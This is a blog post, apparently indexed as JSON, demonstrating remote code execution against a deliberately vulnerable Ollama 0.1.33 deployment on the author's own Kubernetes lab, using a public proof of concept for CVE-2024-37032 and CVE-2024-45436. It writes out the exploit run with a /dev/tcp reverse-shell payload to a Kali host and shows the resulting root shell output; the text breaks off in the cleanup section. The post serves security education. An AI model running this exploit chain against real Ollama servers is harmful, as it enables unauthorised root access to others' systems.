[ { "title": "Exploiting RCE Vulnerabilities in Ollama on Kubernetes", "url": "/posts/ollama-k8s-exploitation/", "categories": "security, kubernetes, genai", "tags": "ollama, kubernetes, security, genai", "date": "2025-07-10 00:00:00 +0200", "content": "Ollama has become a popular tool for running large language models locally. However, like any software, it can have vulnerabilities. This post provides a technical deep dive into two critical vulnerabilities: CVE-2024-37032 and CVE-2024-45436. These vulnerabilities allow for remote code execution (RCE) in older versions of Ollama. This demonstration is for educational purposes only. We will walk through a step-by-step demonstration of how an attacker could exploit these vulnerabilities in an Ollama instance running in a Kubernetes cluster. Understanding these attack vectors is crucial for building robust security postures. üìö References: CVE-2024-37032 Detail CVE-2024-37032 &amp; CVE-2024-45436 Ollama RCE üó∫Ô∏è Architecture Diagram: sequenceDiagram participant Attacker (Kali Linux on EC2) participant Public Internet participant Ollama on EKS participant Ollama Container Attacker (Kali Linux on EC2)-&gt;&gt;+Public Internet: 1. Sends exploit request (CVE-2024-37032 &amp; CVE-2024-45436) Public Internet-&gt;&gt;+Ollama on EKS: 1. Forwards exploit request Ollama on EKS-&gt;&gt;+Ollama Container: 1. Receives malicious payload Ollama Container--&gt;&gt;-Ollama on EKS: 2. Initiates reverse shell connection Ollama on EKS--&gt;&gt;-Public Internet: 2. Forwards reverse shell Public Internet--&gt;&gt;-Attacker (Kali Linux on EC2): 2. Establishes reverse shell Note over Attacker (Kali Linux on EC2), Ollama Container: 3. Attacker gains interactive shell access to the container Prerequisites Before we begin, ensure you have the following tools installed and configured: AWS CLI with appropriate permissions to create resources. rain: A delightful CLI for AWS CloudFormation. helm: The package manager for Kubernetes. Environment Setup The following variables are used in the subsequent steps: # AWS Region export AWS_REGION=\"${AWS_REGION:-us-east-1}\" # Hostname / FQDN definitions export AWS_EC2_KEY_PAIR_NAME=\"ollama-test\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" AWS EC2 instance with Kali Linux Launch an AWS EC2 instance with Kali Linux using a CloudFormation template. # Download the CloudFormation templates # renovate: currentValue=master wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/00284b828a360aa89ac635a44d84c5a748af03d3/ci_tools/vpc_cloudformation_template.yml # renovate: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/2a0cddbdf9bf15dce3faaaf33dc499e52db7423c/cfn/KaliLinux-NICE-DCV.yaml # Create a new AWS EC2 Key Pair to be used for the EC2 instance aws ec2 create-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" --key-type ed25519 --query \"KeyMaterial\" --output text &gt; \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" chmod 600 \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" # Deploy the VPC CloudFormation stack for the Kali Linux environment rain deploy --yes \"${TMP_DIR}/vpc_cloudformation_template.yml\" \"${SOLUTION_KALI}-VPC\" \\ --params \"EnvironmentName=${SOLUTION_KALI}\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_KALI}\" # Extract VPC and Subnet IDs from the CloudFormation stack outputs AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_KALI}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") # Deploy the Kali Linux EC2 instance using the CloudFormation template rain deploy --yes --node-style original \"${TMP_DIR}/KaliLinux-NICE-DCV.yaml\" \"${SOLUTION_KALI}\" \\ --params \"ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME},vpcID=${AWS_VPC_ID},subnetID=${AWS_SUBNET_ID},ec2TerminationProtection=No,allowWebServerPorts=HTTP-and-HTTPS\" \\ --tags \"Owner=${USER},Environment=dev,Solution=${SOLUTION_KALI}\" Configure SSH access to the Kali Linux instance: AWS_EC2_KALI_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_KALI}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' Enabling Karpenter to Provision amd64 Node Pools To enable Karpenter to provision an amd64 node pool, create a new NodePool resource as shown below: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-nodepool-amd64.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1 kind: NodePool metadata: name: my-default-amd64 spec: template: spec: nodeClassRef: group: eks.amazonaws.com kind: NodeClass name: my-default requirements: - key: kubernetes.io/arch operator: In values: [\"amd64\"] limits: cpu: 2 memory: 4Gi EOF Deploying Vulnerable Ollama Instance Install the ollama Helm chart and modify its default values to deploy a vulnerable version (0.1.33): OLLAMA_HELM_CHART_VERSION=\"1.23.0\" helm repo add otwld https://helm.otwld.com/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ollama.yml\" &lt;&lt; EOF image: tag: 0.1.33 ingress: enabled: true hosts: - host: ollama-vulnerable.${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ollama-vulnerable.${CLUSTER_FQDN} nodeSelector: kubernetes.io/arch: amd64 EOF helm upgrade --install --version \"${OLLAMA_HELM_CHART_VERSION}\" --namespace ollama --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ollama.yml\" ollama otwld/ollama Exploit Execution Now, let‚Äôs execute the exploit from the Kali Linux instance. AWS_EC2_KALI_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_KALI}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_PUBLIC_IP}\" &lt;&lt; EOF set -euxo pipefail # Install dependencies sudo apt update -qq &amp;&amp; sudo apt install -qqy golang-go ncat # Run ncat echo -e \"pwd \\n ps -elf \\n whoami\" | sudo ncat -lnvp 80 --idle-timeout 5 --output /tmp/ncat.log &amp; # Clone the exploit repository git clone https://github.com/pankass/CVE-2024-37032_CVE-2024-45436.git cd CVE-2024-37032_CVE-2024-45436 || exit # Run the exploit # The target is our vulnerable Ollama service. # The -exec payload will create a reverse shell back to our Kali instance. go run main.go -target \"https://ollama-vulnerable.${CLUSTER_FQDN}\" -exec \"bash -i &gt;&amp; /dev/tcp/${AWS_EC2_KALI_PUBLIC_IP}/80 0&gt;&amp;1\" EOF ... ... Vulnerability does exist!!! http log: http log: {\"status\":\"unpacking model metadata\"} {\"error\":\"couldn't determine model format\"} pulling model, please wait...... http log: {\"status\":\"pulling manifest\"} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":4161536} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":8585216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":10043392} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":15138816} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":19005440} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":23265280} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":26275840} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":28880896} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":33161216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":37093376} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":43012096} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling 797b70c4edf8\",\"digest\":\"sha256:797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662\",\"total\":45949216,\"completed\":45949216} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling c71d239df917\",\"digest\":\"sha256:c71d239df91726fc519c6eb72d318ec65820627232b2f796219e87dcf35d0ab4\",\"total\":11357,\"completed\":11357} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 85011998c600\",\"digest\":\"sha256:85011998c600549934d2b696d7f0cb5078192b56f6c954f6987bf9228870017e\",\"total\":16,\"completed\":16} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"pulling 548455b72658\",\"digest\":\"sha256:548455b7265836afeea130cfc8919fa3311af2a55b9fec3cbd04e811bb600ee8\",\"total\":407,\"completed\":407} {\"status\":\"verifying sha256 digest\"} {\"status\":\"writing manifest\"} {\"status\":\"removing any unused layers\"} {\"status\":\"success\"} ... ... Review the results of the commands executed on the compromised container, as captured by ncat: ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_PUBLIC_IP}\" \"cat /tmp/ncat.log\" pwd ps -elf whoami bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@ollama-647f4bd9b6-2nzvm:/# pwd / root@ollama-647f4bd9b6-2nzvm:/# ps -elf F S UID PID PPID C PRI NI ADDR SZ WCHAN STIME TTY TIME CMD 4 S root 1 0 7 80 0 - 512099 futex_ 15:51 ? 00:00:06 /bin/ollama serve 0 S root 14 1 0 80 0 - 2501 do_wai 15:52 ? 00:00:00 /tmp/ollama2637438906/runners/cpu_avx2/ollama_llama_server --model /root/.ollama/models/blobs/sha256-797b70c4edf85907fe0a49eb85811256f65fa0f7bf52166b147fd16be2be4662 --ctx-size 256 --batch-size 512 --embedding --log-disable --parallel 1 --port 42595 4 S root 15 14 0 80 0 - 723 do_wai 15:52 ? 00:00:00 sh -c bash -c 'bash -i &gt;&amp; /dev/tcp/50.16.37.101/80 0&gt;&amp;1' 4 S root 16 15 0 80 0 - 1091 do_wai 15:52 ? 00:00:00 bash -c bash -i &gt;&amp; /dev/tcp/50.16.37.101/80 0&gt;&amp;1 4 S root 17 16 0 80 0 - 1157 do_wai 15:52 ? 00:00:00 bash -i 4 R root 20 17 0 80 0 - 1766 - 15:52 ? 00:00:00 ps -elf root@ollama-647f4bd9b6-2nzvm:/# whoami root root@ollama-647f4bd9b6-2nzvm:/# exit View Ollama Pod Logs: kubectl logs -n ollama \"$(kubectl get pods -n ollama -o jsonpath='{.items[0].metadata.name}')\" Couldn't find '/root/.ollama/id_ed25519'. Generating new private key. Your new public key is: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKPJt8RLcfSPdRn0b1uWMsLOVoJHq+o761pxK56ehTdn time=2025-07-11T15:51:36.369Z level=INFO source=images.go:828 msg=\"total blobs: 0\" time=2025-07-11T15:51:36.369Z level=INFO source=images.go:835 msg=\"total unused blobs removed: 0\" time=2025-07-11T15:51:36.370Z level=INFO source=routes.go:1071 msg=\"Listening on [::]:11434 (version 0.1.33)\" llm_load_print_meta: model type = 22M llm_load_print_meta: model ftype = F16 llm_load_print_meta: model params = 22.57 M llm_load_print_meta: model size = 43.10 MiB (16.02 BPW) llm_load_print_meta: general.name = all-MiniLM-L6-v2 llm_load_print_meta: BOS token = 101 '[CLS]' llm_load_print_meta: EOS token = 102 '[SEP]' llm_load_print_meta: UNK token = 100 '[UNK]' llm_load_print_meta: SEP token = 102 '[SEP]' llm_load_print_meta: PAD token = 0 '[PAD]' llm_load_print_meta: CLS token = 101 '[CLS]' llm_load_print_meta: MASK token = 103 '[MASK]' llm_load_print_meta: LF token = 0 '[PAD]' llm_load_tensors: ggml ctx size = 0.05 MiB llm_load_tensors: CPU buffer size = 43.10 MiB ............................... llama_new_context_with_model: n_ctx = 256 llama_new_context_with_model: n_batch = 512 llama_new_context_with_model: n_ubatch = 512 llama_new_context_with_model: freq_base = 10000.0 llama_new_context_with_model: freq_scale = 1 llama_kv_cache_init: CPU KV buffer size = 2.25 MiB llama_new_context_with_model: KV self size = 2.25 MiB, K (f16): 1.12 MiB, V (f16): 1.12 MiB llama_new_context_with_model: CPU output buffer size = 0.00 MiB llama_new_context_with_model: CPU compute buffer size = 5.00 MiB llama_new_context_with_model: graph nodes = 221 llama_new_context_with_model: graph splits = 1 {\"function\":\"initialize\",\"level\":\"INFO\",\"line\":448,\"msg\":\"initializing slots\",\"n_slots\":1,\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"initialize\",\"level\":\"INFO\",\"line\":457,\"msg\":\"new slot\",\"n_ctx_slot\":256,\"slot_id\":0,\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"main\",\"level\":\"INFO\",\"line\":3067,\"msg\":\"model loaded\",\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"main\",\"hostname\":\"127.0.0.1\",\"level\":\"INFO\",\"line\":3270,\"msg\":\"HTTP server listening\",\"n_threads_http\":\"3\",\"port\":\"42595\",\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"update_slots\",\"level\":\"INFO\",\"line\":1581,\"msg\":\"all slots are idle and system prompt is empty, clear the KV cache\",\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"process_single_task\",\"level\":\"INFO\",\"line\":1509,\"msg\":\"slot data\",\"n_idle_slots\":1,\"n_processing_slots\":0,\"task_id\":0,\"tid\":\"139831842998144\",\"timestamp\":1752249176} {\"function\":\"log_server_request\",\"level\":\"INFO\",\"line\":2737,\"method\":\"GET\",\"msg\":\"request\",\"params\":{},\"path\":\"/health\",\"remote_addr\":\"127.0.0.1\",\"remote_port\":45762,\"status\":200,\"tid\":\"139831757436480\",\"timestamp\":1752249176} [GIN] 2025/07/11 - 15:52:56 | 200 | 256.889485ms | 50.16.37.101 | POST \"/api/embeddings\" [GIN] 2025/07/11 - 15:52:58 | 200 | 19.515¬µs | 192.168.95.252 | GET \"/\" üïπÔ∏è Recorded screen cast: Conclusion This walkthrough demonstrated that CVE-2024-37032 and CVE-2024-45436 are critical vulnerabilities that can lead to a full container compromise with relative ease. While we used a specific public PoC, the underlying vulnerability could be exploited in various ways. Cleanup Delete the Kali Linux EC2 instance, EC2 Key Pair, and related CloudFormation stack: export AWS_REGION=\"${AWS_REGION:-us-east-1}\" export AWS_EC2_KEY_PAIR_NAME=\"ollama-test\" export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Delete CloudFormation stack aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}\" # Delete EKS cluster if exists if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi # Delete VPC stack and EC2 key pair aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}-VPC\" aws ec2 delete-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" # Remove local files for FILE in 